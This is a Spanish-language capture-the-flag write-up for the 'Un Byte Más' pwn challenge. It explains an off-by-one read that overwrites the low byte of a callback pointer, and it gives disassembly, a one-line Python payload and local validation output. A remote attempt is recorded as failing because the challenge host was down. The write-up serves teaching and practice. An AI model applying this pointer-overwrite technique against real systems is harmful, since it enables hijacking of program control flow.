# Un Byte Más — TRAMA CTF 2026

| Campo | Valor |
|---|---|
| Categoría | Pwn / off-by-one |
| Dificultad | Media |
| Puntos | — |
| Estado | 🚧 exploit validado en local — **flag remota pendiente (host caído)** |
| Flag | *(pendiente)* |
| Fecha | 2026-10-24 |

## Enunciado

«En el archivo de TRAMA, cada mensaje debía ocupar exactamente el espacio asignado.
El protocolo era sencillo: una trama de 32 bytes, una compuerta de cierre y ninguna
excepción. Sin embargo, en el último registro apareció una diferencia mínima. El sistema
aceptó un byte adicional y lo que debía ser una operación rutinaria cambió de destino».

Conexión indicada: `<host> 3206`.

## Evidencia

| Archivo | Rol |
|---|---|
| `un_byte_mas` | ELF 64-bit LSB, x86-64, **estático**, stripped, 686.240 B |
| SHA-256 | `705e81f13cdc8b340de1188ce3c67d9f06301129f8a29d35ed29c971d8eebbf0` |

Checksec:

```
Partial RELRO | No canary | NX enabled | No PIE
```

## Reconocimiento

Al ejecutarlo imprime un banner y filtra la dirección de la «compuerta»:

```
       .-------------.
      /  00000000     \
     |  00000000  +1   |
      \  00000000    /
       '-------------'
Compuerta activa: 0x478100
Trama (33 bytes):
```

`strings` muestra `/tmp/flag` y un señuelo `flag{ejemplo}`.
La flag real se lee de `/tmp/flag` en el servidor.

## Análisis

El punto de entrada (`0x401780`) llama a `__libc_start_main` con `main = 0x4019f2`.
La lógica útil está en la función `0x4018c0`:

```asm
4018c0: push rbx
4018c1: sub  rsp, 0x30
4018c5: pxor xmm0, xmm0
4018c9: movaps [rsp], xmm0
4018cd: movaps [rsp+0x10], xmm0        ; 32 bytes de trama a cero
4018d2: mov  rax, 0x478100
4018d9: mov  [rsp+0x20], rax           ; puntero a la "compuerta"
4018de: lea  rdi, [rip+0x7772b]        ; "@@Trama (33 bytes):"
4018e5: call puts
4018ea: mov  edx, 0x21                 ; 33 bytes
4018ef: mov  rsi, rsp                  ; buffer de 32
4018f2: mov  edi, 0
4018f7: call read
4018fc: call qword [rsp+0x20]          ; ejecuta la compuerta
401900: add  rsp, 0x30
401904: pop  rbx
401905: ret
```

**El fallo:** `read(0, rsp, 0x21)` lee **33 bytes** sobre un buffer de **32**. El byte
33 cae exactamente sobre el byte bajo del puntero `[rsp+0x20]`.

La compuerta `0x478100` está en la sección `.callbacks`: es un `ret` seguido de un
NOP-sled hasta `0x478170`:

```asm
478100: c3                    ret
478101: 90 90 90 ...          ; NOPs
478170: e9 1c 98 f8 ff        jmp 0x401991
```

`0x401991` es la rutina oculta que hace `fopen("/tmp/flag")`, lee hasta 0x80 bytes
y los imprime con `puts`.

Por tanto, cambiar el byte bajo `0x00 → 0x50` convierte el puntero en `0x478150`:
el flujo recorre el NOP-sled, salta a `0x401991` y muestra la flag. Sin el byte extra
la compuerta original solo hace `ret` y no imprime nada.

`main` incluye un chequeo de integridad/anti-debug con semilla `0x13579bdf` sobre
20 bytes en `0x47b260`; el resultado debe ser `0x7c2a1d30` o el programa sale. No
interfiere con el off-by-one (el binario local llega al `read` normalmente).

## Explotación

Payload: **32 bytes de relleno + 1 byte** que sobrescribe el puntero.

```python
payload = b"A" * 32 + b"\x50"
```

Cualquier valor `0x01..0x70` funciona (0x50 es el más claro: NOP-sled; 0x70 salta
directo al `jmp`). `0x00` deja la compuerta original y no imprime nada.

Validación local con `/tmp/flag` de prueba:

```
Compuerta activa: 0x478100
Trama (33 bytes):
flag{ejemplo}
```

Salida guardada en `work/salida_local.txt`; payload en `work/payload.bin`.

## Intento remoto

`<host>` resuelve a `203.0.113.10`, pero **el puerto 3206 no acepta
conexiones**:

- Kali (nc, Python, `/dev/tcp`) y Windows (`Test-NetConnection`): timeout.
- Todos los puertos del host (22/80/443/3206): timeout.
- check-host.net desde 5 nodos (DE, IL, IT, TR, US): `Connection timed out` en todos
  (`https://check-host.net/check-report/533185b4k4c6`).
- Control: `example.com` responde 200 y `203.0.113.10:80` conecta.

Conclusión: la instancia está apagada o el puerto no está publicado. No es un
bloqueo de la red local. Evidencia completa en `work/evidencia_red.txt`.

## Solución reproducible

```bash
# cuando el servicio esté arriba
python3 solucion/solve.py
# o con parámetros explícitos
python3 solucion/solve.py --host <host> --port 3206 --byte 0x50
```

El script espera el prompt `Trama (33 bytes):`, envía los 33 bytes y extrae la flag.

## Pendiente

- Obtener la flag remota cuando el host vuelva a responder y guardarla en `flag.txt`.
- Actualizar esta ficha y el índice a «resuelto».

## Lecciones

- Un `read` con tamaño `buffer+1` es suficiente para desviar un puntero de callback
  almacenado justo detrás del buffer.
- Un NOP-sled en una sección de callbacks con un `jmp` al final convierte un cambio
  de un solo byte en una llamada arbitraria a la rutina oculta.
- El leak de la dirección (`Compuerta activa: 0x478100`) y la ausencia de PIE hacen
  determinista el desplazamiento.
